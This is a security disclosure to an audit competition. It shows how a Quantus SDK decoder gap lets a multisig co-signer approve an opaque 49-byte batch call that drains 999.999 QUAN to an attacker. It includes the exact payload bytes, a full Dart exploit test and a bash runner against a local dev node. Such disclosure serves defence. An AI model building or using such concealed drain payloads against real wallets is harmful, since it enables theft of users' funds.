# 89806 w a high frozen vesting decode failure leaves an opaque multisig approval actionable and allows a 999 999 quan drain

**Submitted on Aug 21st 2026 at 09:56:16 UTC by @legat for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89806
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Summary of the technically proven frozen issue

The frozen chain is runtime spec 143 and registers Vesting at `RuntimeCall` pallet index 22. The frozen SDK declares bundled spec 136 and its generated `RuntimeCall` switch has no case 22. Any canonical composite call containing Vesting therefore throws in the official SDK.

The mobile multisig confirmation successfully loads the authoritative storage bytes, catches the semantic decode exception, falls back to generic/non-authoritative top-level information, and leaves Approve/Execute enabled. Its `blocked` predicate covers byte-loading failure but not the state “bytes loaded, authoritative semantic decode failed.”

The E2E constructs a canonical 49-byte call:

```
Utility.force_batch([
  Vesting.claim(schedule_id = u64::MAX),
  Balances.transfer_all(dest = Id(attacker), keep_alive = true)
])
```

A real 2-of-2 proposal stores the exact bytes. Bob's real signed approval preserves them and crosses threshold. Alice executes. `Vesting.claim(u64::MAX)` returns the ordinary `NoSchedule` error, `force_batch` continues, and the attacker receives 999.999 QUAN from a 1,000 QUAN multisig while the existential deposit remains.

## Description

### Intended behavior

An actionable multisig review must be bound to the connected runtime and must successfully decode every nested authoritative call/parameter. If the client cannot understand exact stored bytes, it must show a blocking incompatibility error and refuse Approve/Execute.

### Frozen actual behavior

The frozen generated `RuntimeCall` decoder recognizes indices:

```
0, 1, 2, 7, 9, 11, 13, 14, 15, 16, 17, 19, 20
```

and otherwise throws:

```dart
default:
  throw Exception('RuntimeCall: Invalid variant index: "$index"');
```

The frozen chain composition contains:

```rust
#[runtime::pallet_index(22)]
pub type Vesting = pallet_vesting;
```

`CallDecoder.decodeBytes()` allows this generated exception to propagate. `MultisigProposal.decodedCall` catches it and returns null. The authoritative hydration then clears transfer summary details when `decodedCall?.summary` is absent.

The confirmation does not translate that semantic failure into `_callBytesFailed`. The relevant gate is:

```dart
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;
```

Therefore successful RPC byte retrieval is treated as sufficient even when those bytes cannot be reviewed.

### Exact 49-byte layout

For attacker AccountId `A`:

```
09          RuntimeCall::Utility
04          Utility::force_batch
08          compact Vec length 2
16 00       RuntimeCall::Vesting (22), Vesting::claim (0)
ff...ff     u64::MAX schedule id (8 bytes little-endian)
02 04       RuntimeCall::Balances, transfer_all
00          MultiAddress::Id
A x 32      attacker AccountId
01          keep_alive = true
```

Exact continuous reference-run form using Crystal Charlie's documented local-development AccountId:

```
0904081600ffffffffffffffff02040097bc5f2db1efa23fb71f6737fcb26e41e448aff07447011369df81ce4355546501
```

This is canonical and contains no trailing bytes, alternate compact encoding, or ignored suffix. It is distinct from the older noncanonical trailing-byte trigger.

## Root cause

The frozen root crosses three Quantus-controlled boundaries:

1. **Binding drift:** chain spec 143 has Vesting/index 22, while the checked-in bundled SDK is spec 136 and omits it.
2. **Error-state loss:** the authoritative decoder exception becomes nullable display data rather than an actionable hard error.
3. **Fail-open authorization:** the button gate requires successful byte loading but not successful semantic decoding.

Immutable affected source:

* [`runtime_call.dart:100-135`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/generated/planck/types/quantus_runtime/runtime_call.dart#L100-L135)
* [`app_constants.dart:60-65`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/constants/app_constants.dart#L60-L65)
* [`call_decoder.dart:48-59`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L48-L59)
* [`multisig_proposal.dart:268-274`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/models/multisig_proposal.dart#L268-L274)
* [`multisig_action_confirm_sheet.dart:156-210,345-408`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart#L156-L210)
* [`runtime/src/lib.rs:283-287`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs#L283-L287)

## Frozen technical risk

### Impact

Measured result:

```
funded multisig:    1,000.000000000000 QUAN
multisig after:         0.001000000000 QUAN
multisig loss:        999.999000000000 QUAN
attacker gain:         999.999000000000 QUAN
```

The victim's approval is necessary to cross a genuine threshold, but the official actionable path cannot display any child or material parameter from the exact bytes. The proven frozen-target behavior maps directly to the listed Critical impacts: direct theft and malicious interaction with an already-connected wallet.

The report does not claim that the victim sees a benign recipient or decoded safe transfer. The actual frozen failure is an opaque/generic wrapper with missing children and no blocking warning.

### Likelihood

* Ordinary member of a normal non-high-security 2-of-2
* One 49-byte canonical proposal
* Arbitrary real attacker AccountId
* Normal proposal fees/deposit and ordinary expiry
* No private key theft, malformed payload, indexer corruption, oracle, admin, governance, Technical Collective, hardware wallet, race, or harmful trusted configuration

## Attack path

{% stepper %}
{% step %}

## Create a normal multisig

Alice and Bob create a normal non-high-security 2-of-2 multisig.
{% endstep %}

{% step %}

## Fund the multisig

Bob funds it with 1,000 QUAN.
{% endstep %}

{% step %}

## Propose the concealed composite call

Alice proposes the canonical 49-byte `force_batch` and is recorded as first approver.
{% endstep %}

{% step %}

## Store the authoritative bytes

The frozen runtime accepts and stores the exact bytes.
{% endstep %}

{% step %}

## Retrieve the proposal

Bob's official flow retrieves those authoritative bytes.
{% endstep %}

{% step %}

## Trigger the decoder failure

The SDK throws at the valid nested Vesting index 22.
{% endstep %}

{% step %}

## Leave the action enabled

The mobile confirmation catches the failure but does not set a blocking byte-load error.
{% endstep %}

{% step %}

## Approve the concealed bytes

Bob completes the ordinary approval; the exact stored bytes are resubmitted and approvals become two.
{% endstep %}

{% step %}

## Execute the proposal

Alice executes as an ordinary member.
{% endstep %}

{% step %}

## Continue after the Vesting error

Vesting returns `NoSchedule`; `force_batch` intentionally continues.
{% endstep %}

{% step %}

## Drain the multisig

`transfer_all(Id(attacker), true)` moves 999.999 QUAN and preserves the shared account.
{% endstep %}
{% endstepper %}

The PoC directly proves steps 1–6 and 8–11 with real signatures/storage/execution/balances. Step 7 is established by the exact frozen mobile source. No device UI automation is claimed.

## Preconditions

### External

* The normal proposal discovery flow surfaces the active proposal.
* The victim uses the official software-signer approval flow and chooses Approve.

### Internal

* Frozen/released vulnerable SDK binding.
* Chain runtime containing Vesting index 22.
* Normal non-high-security multisig with reducible balance.

No malicious indexer behavior is required; authoritative bytes create the failure.

## Affected code and complete flow

| Role                        | Code                                                                                    | Frozen effect                                             |
| --------------------------- | --------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| Runtime/SDK schema mismatch | `quantus_sdk/lib/generated/planck/types/quantus_runtime/runtime_call.dart:100-135`      | Omits active Vesting index 22 and throws                  |
| Bundled-version evidence    | `quantus_sdk/lib/src/constants/app_constants.dart:60-65`                                | Pins generated review binding to spec 136                 |
| Authoritative decoder       | `quantus_sdk/lib/src/chain/call_decoder.dart:48-59`                                     | Propagates unknown-variant failure                        |
| Nullable model sink         | `quantus_sdk/lib/src/models/multisig_proposal.dart:268-274`                             | Converts security-relevant failure to null                |
| Authoritative hydration     | `quantus_sdk/lib/src/services/multisig_service.dart:293-325`                            | Clears actionable summary fields after null decode        |
| Mobile action gate          | `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:156-210,345-408` | Catches decode error but blocks only on byte-load failure |
| Exact-byte approval         | `quantus_sdk/lib/src/services/multisig_service.dart:395-448`                            | Submits the same concealed bytes                          |
| Runtime ground truth        | `runtime/src/lib.rs:283-287`                                                            | Registers Vesting at pallet index 22                      |
| Threshold/dispatch          | `pallets/multisig/src/lib.rs:779-825,1123-1166`                                         | Counts approval and dispatches as the shared account      |

`Utility.force_batch`, Vesting's ordinary error, and Balances `transfer_all` behave as designed; they are impact carriers rather than separately alleged defects.

## Recommended mitigation

{% stepper %}
{% step %}

## Generate exact SDK bindings

Generate/release SDK bindings from the exact runtime, including Vesting 22 and removal of obsolete Assets 17.
{% endstep %}

{% step %}

## Model decoding states

Represent authoritative decoding as a tri-state: loading, success, or failure.
{% endstep %}

{% step %}

## Fail closed on semantic failures

Disable Approve/Execute on semantic failure; never use indexer headlines or empty fields as actionable review.
{% endstep %}

{% step %}

## Verify runtime compatibility

Compare connected runtime metadata/spec/type fingerprints with the bundled decoder before signing.
{% endstep %}

{% step %}

## Surface the decoding error

Surface `decode_error` and an explicit update-required warning.
{% endstep %}

{% step %}

## Enumerate runtime calls in CI

Differentially enumerate every active runtime pallet/call in CI.
{% endstep %}

{% step %}

## Test nested unknown calls

Test unknown children inside `batch`, `batch_all`, `force_batch`, and `if_else`.
{% endstep %}

{% step %}

## Keep canonical checks as defense in depth

Retain chain canonical decode/re-encode checks as defense in depth.
{% endstep %}
{% endstepper %}

## Proof of Concept

### Proof boundary and topology

The PoC exercises the exact frozen release node/runtime spec 143, Quantus Rust key derivation, SDK signatures, real balances, multisig creation, funding, 49-byte canonical proposal storage, authoritative retrieval, exact index-22 decoder failure, Bob's exact-byte approval, threshold crossing, Alice execution, and final balances.

One exact release node is sufficient. There is no consensus, validator-divergence, network-partition, P2P, or cluster claim. The proof boundary is canonical storage, signatures/threshold, one runtime's deterministic dispatch, frozen SDK/mobile behavior, and balances. A cluster would execute identical call semantics and add no evidence.

Test-local preferences/secure storage only provide documented disposable development mnemonics. No proposal, decoder result, signature, storage value, call result, token, or balance is mocked.

### File layout

Place these files in the frozen apps checkout; keep sibling `audit-comp-quantus-chain`:

```
audit-comp-quantus-apps/
├── poc/quantus-report-2/run.sh
└── quantus_sdk/test/poc/vesting_fail_open_node_e2e_test.dart
```

### Complete Dart E2E PoC

Save as `quantus_sdk/test/poc/vesting_fail_open_node_e2e_test.dart`:

```dart
import 'dart:async';
import 'dart:io';

import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:polkadart/polkadart.dart';
import 'package:quantus_sdk/generated/planck/pallets/multisig.dart' as multisig;
import 'package:quantus_sdk/generated/planck/planck.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  test('canonical Vesting call hidden from frozen decoder drains multisig', () async {
    HttpOverrides.global = null;
    SharedPreferences.setMockInitialValues({});
    FlutterSecureStorage.setMockInitialValues({
      'mnemonic': AppConstants.crystalAlice,
      'mnemonic_1': AppConstants.crystalBob,
    });
    await QuantusSdk.init();
    RpcEndpointService().endpoints
      ..clear()
      ..add(Endpoint(url: 'http://127.0.0.1:9944'));

    final alicePair = HdWalletService().keyPairAtIndex(AppConstants.crystalAlice, 0);
    final bobPair = HdWalletService().keyPairAtIndex(AppConstants.crystalBob, 0);
    final charliePair = HdWalletService().keyPairAtIndex(AppConstants.crystalCharlie, 0);
    final alice = Account(walletIndex: 0, index: 0, name: 'Alice', accountId: alicePair.ss58Address);
    final bob = Account(walletIndex: 1, index: 0, name: 'Bob', accountId: bobPair.ss58Address);
    final service = MultisigService();
    final provider = Provider.fromUri(Uri.parse('http://127.0.0.1:9944'));
    final api = Planck(provider);

    final nonce = BigInt.from(DateTime.now().microsecondsSinceEpoch);
    final address = await service.predictMultisigAddress(
      signers: [alice.accountId, bob.accountId],
      threshold: 2,
      nonce: nonce,
    );
    final msig = MultisigAccount(
      name: 'PoC',
      accountId: address,
      signers: [alice.accountId, bob.accountId],
      threshold: 2,
      nonce: nonce,
      myMemberAccountId: bob.accountId,
    );
    await service.submitCreateMultisigExtrinsic(
      creator: alice,
      signers: msig.signers,
      threshold: msig.threshold,
      nonce: nonce,
    );
    await _waitFor(() async => await api.query.multisig.multisigs(getAccountId32(address)) != null);

    const unit = 1000000000000;
    final funded = BigInt.from(1000) * BigInt.from(unit);
    await BalancesService().balanceTransfer(bob, address, funded);
    await _waitFor(() async => (await api.query.system.account(getAccountId32(address))).data.free == funded);

    // Runtime interpretation (spec 143):
    // Utility.force_batch([Vesting.claim(u64::MAX),
    //                      Balances.transfer_all(Charlie, keep_alive=true)]).
    final charlieId = getAccountId32(charliePair.ss58Address);
    final raw = <int>[
      9, 4, 8, // Utility.force_batch, Vec length 2.
      22, 0, // Vesting.claim.
      ...List<int>.filled(8, 0xff), // Absent schedule id: force_batch continues.
      2, 4, 0, // Balances.transfer_all, MultiAddress::Id.
      ...charlieId,
      1, // keep_alive=true, avoiding account reaping.
    ];
    expect(raw.length, 49);

    Object? decoderError;
    try {
      CallDecoder.decodeBytes(raw);
    } catch (error) {
      decoderError = error;
    }
    print('frozen_sdk_decode_error=$decoderError');
    expect(decoderError, isNotNull);

    final current = await service.currentBlockNumber();
    await SubstrateService().submitExtrinsic(
      alice,
      const multisig.Txs().propose(multisigAddress: getAccountId32(address), call: raw, expiry: current + 100),
    );
    await _waitFor(() async => await api.query.multisig.proposals(getAccountId32(address), 0) != null);
    expect(await service.fetchProposalCallBytes(msig: msig, proposalId: 0), raw);

    final recipientBefore = (await api.query.system.account(charlieId)).data.free;
    await service.submitApproveExtrinsic(msig: msig, signer: bob, proposalId: 0, callBytes: raw);
    await _waitFor(() async {
      final proposal = await api.query.multisig.proposals(getAccountId32(address), 0);
      return proposal?.approvals.length == 2;
    });
    await service.submitExecuteExtrinsic(msig: msig, signer: alice, proposalId: 0);
    await _waitFor(() async => await api.query.multisig.proposals(getAccountId32(address), 0) == null);

    final balanceAfter = (await api.query.system.account(getAccountId32(address))).data.free;
    final recipientAfter = (await api.query.system.account(charlieId)).data.free;
    final multisigLoss = funded - balanceAfter;
    final recipientGain = recipientAfter - recipientBefore;
    print(
      'raw_bytes=${raw.length} funded=$funded balance_after=$balanceAfter '
      'multisig_loss=$multisigLoss attacker_gain=$recipientGain',
    );
    expect(balanceAfter, lessThan(BigInt.from(unit)));
    expect(recipientGain, multisigLoss);
    expect(recipientGain, greaterThan(BigInt.from(999) * BigInt.from(unit)));
    await provider.disconnect();
  }, timeout: const Timeout(Duration(minutes: 4)));
}

Future<void> _waitFor(Future<bool> Function() predicate) async {
  for (var i = 0; i < 90; i++) {
    if (await predicate()) return;
    await Future<void>.delayed(const Duration(seconds: 1));
  }
  throw TimeoutException('condition was not reached');
}
```

### Complete verifier and runner

Save as `poc/quantus-report-2/run.sh` and make executable:

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
APPS_ROOT="$(cd -- "$SCRIPT_DIR/../.." && pwd)"
CHAIN_ROOT="$(cd -- "$APPS_ROOT/../audit-comp-quantus-chain" && pwd)"
SDK_ROOT="$APPS_ROOT/quantus_sdk"
TEST_FILE="$SDK_ROOT/test/poc/vesting_fail_open_node_e2e_test.dart"
EVIDENCE_DIR="$SCRIPT_DIR/evidence"
RPC_URL="http://127.0.0.1:9944"
EXPECTED_APPS_COMMIT="d5fc4d6572ebc2244e95009a33f5da5048935867"
EXPECTED_CHAIN_COMMIT="3b243b870a5442a6e5f443056f67bbba87d472f5"
EXPECTED_RUNTIME_CALL_SHA="16d76e7a234b6e6108cd9b44dbe81aaec35c384f49268dfa811623cd0f4e6846"
EXPECTED_CONFIRM_SHA="be57aa7c18dc96b9ab97545e78f1a169dbff045e4c42fdd536c874b9268b0ef0"
EXPECTED_TEST_SHA="b88969b36d128fdb2cf9d4a760dad205d75530e35e24a94481790ee2c8d800d2"

hash_file() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

[[ "$(git -C "$APPS_ROOT" rev-parse HEAD)" == "$EXPECTED_APPS_COMMIT" ]]
[[ "$(git -C "$CHAIN_ROOT" rev-parse HEAD)" == "$EXPECTED_CHAIN_COMMIT" ]]
[[ "$(hash_file "$SDK_ROOT/lib/generated/planck/types/quantus_runtime/runtime_call.dart")" == "$EXPECTED_RUNTIME_CALL_SHA" ]]
[[ "$(hash_file "$APPS_ROOT/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart")" == "$EXPECTED_CONFIRM_SHA" ]]
[[ "$(hash_file "$TEST_FILE")" == "$EXPECTED_TEST_SHA" ]]

FLUTTER_BIN="${FLUTTER_BIN:-$(command -v flutter || true)}"
[[ -n "$FLUTTER_BIN" && -x "$FLUTTER_BIN" ]] || {
  echo "Flutter not found; put flutter on PATH or set FLUTTER_BIN" >&2
  exit 1
}

NODE_BIN="$CHAIN_ROOT/target/release/quantus-node"
if [[ ! -x "$NODE_BIN" ]]; then
  cargo build --release --bin quantus-node --manifest-path "$CHAIN_ROOT/Cargo.toml"
fi

if curl -fsS -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  "$RPC_URL" >/dev/null 2>&1; then
  echo "Port 9944 already serves RPC; stop it before this isolated run" >&2
  exit 1
fi

mkdir -p "$EVIDENCE_DIR"
: >"$EVIDENCE_DIR/node.log"
: >"$EVIDENCE_DIR/e2e.log"
: >"$EVIDENCE_DIR/rpc.ndjson"

"$NODE_BIN" --dev --tmp --rpc-port 9944 --rpc-methods Unsafe --rpc-cors all -lerror \
  >"$EVIDENCE_DIR/node.log" 2>&1 &
NODE_PID=$!
cleanup() {
  if kill -0 "$NODE_PID" >/dev/null 2>&1; then
    kill "$NODE_PID" >/dev/null 2>&1 || true
    wait "$NODE_PID" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT INT TERM

for _ in $(seq 1 120); do
  if curl -fsS -H 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
    "$RPC_URL" >/dev/null 2>&1; then
    break
  fi
  sleep 0.25
done

for request in \
  '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  '{"jsonrpc":"2.0","id":2,"method":"system_version","params":[]}' \
  '{"jsonrpc":"2.0","id":3,"method":"state_getRuntimeVersion","params":[]}' \
  '{"jsonrpc":"2.0","id":4,"method":"chain_getBlockHash","params":[0]}'
do
  curl -fsS -H 'content-type: application/json' --data "$request" "$RPC_URL" \
    | tee -a "$EVIDENCE_DIR/rpc.ndjson"
  echo >>"$EVIDENCE_DIR/rpc.ndjson"
done
rg -q '"specVersion":143' "$EVIDENCE_DIR/rpc.ndjson"

cd "$SDK_ROOT"
"$FLUTTER_BIN" test test/poc/vesting_fail_open_node_e2e_test.dart --reporter expanded \
  2>&1 | tee "$EVIDENCE_DIR/e2e.log"

rg -q 'RuntimeCall: Invalid variant index: "22"' "$EVIDENCE_DIR/e2e.log"
rg -q 'raw_bytes=49 .*multisig_loss=999999000000000 attacker_gain=999999000000000' "$EVIDENCE_DIR/e2e.log"
rg -q 'All tests passed!' "$EVIDENCE_DIR/e2e.log"
echo "PASS: exact frozen node + SDK Vesting fail-open E2E"
```

Run the frozen-target E2E:

```bash
cd poc/quantus-report-2
chmod +x run.sh
./run.sh
```

### Captured reference node fingerprint

```json
{"jsonrpc":"2.0","id":1,"result":{"peers":0,"isSyncing":false,"shouldHavePeers":false}}
{"jsonrpc":"2.0","id":2,"result":"0.8.0-exodus-3b243b870a5"}
{"jsonrpc":"2.0","id":3,"result":{"specName":"quantus-runtime","implName":"quantus-runtime","authoringVersion":1,"specVersion":143,"implVersion":1,"transactionVersion":3,"systemVersion":1,"stateVersion":1}}
{"jsonrpc":"2.0","id":4,"result":"0xbbffbd5377d630dd2608e411a16c0f45343948b861d78493863b98b901573155"}
```

The runner records the complete runtime-version response including its `apis` array.

### Captured reference E2E output

```
submitExtrinsic response: 0x7bea5e21d8469395ab33c0794f88028c5a69c3e751dfee64e813704ad84b240a
submitExtrinsic response: 0xa136ac023d631cfe335beed9cb02a387730904efb018da6a575c204f73f8bffd
frozen_sdk_decode_error=Exception: RuntimeCall: Invalid variant index: "22"
submitExtrinsic response: 0xfc77717e6764594f7e6fc077d282d4c513bdb14d305a0f2485cf9503bccaa7cf
submitExtrinsic response: 0x6b08791e7e7434fd248d106c4a8e61df51afbac62480adaff1f6ccbd07fb21eb
submitExtrinsic response: 0xf3ac133835c5dd4c1625dcaac76f4eb1bcaa1afeb5862ab7bbe1b5a97635a695
raw_bytes=49 funded=1000000000000000 balance_after=1000000000 multisig_loss=999999000000000 attacker_gain=999999000000000
00:22 +1: All tests passed!
```

These are real signed create, funding, propose, Bob approve, and Alice execute transaction hashes in order.

## Determinism and falsification

The frozen test fails unless the generated SDK throws specifically on active runtime index 22, the runtime accepts/stores exactly 49 bytes, Bob reaches two approvals, execution removes the proposal, the multisig ends below one QUAN at the existential deposit, and recipient gain exactly equals multisig loss above 999 QUAN.

`u64::MAX` makes the Vesting failure deterministic; `force_batch` makes continuation deterministic; `keep_alive=true` eliminates account-reaping/replay. A corrected binding containing Vesting/index 22 is the negative control: the decode-error assertion must fail.
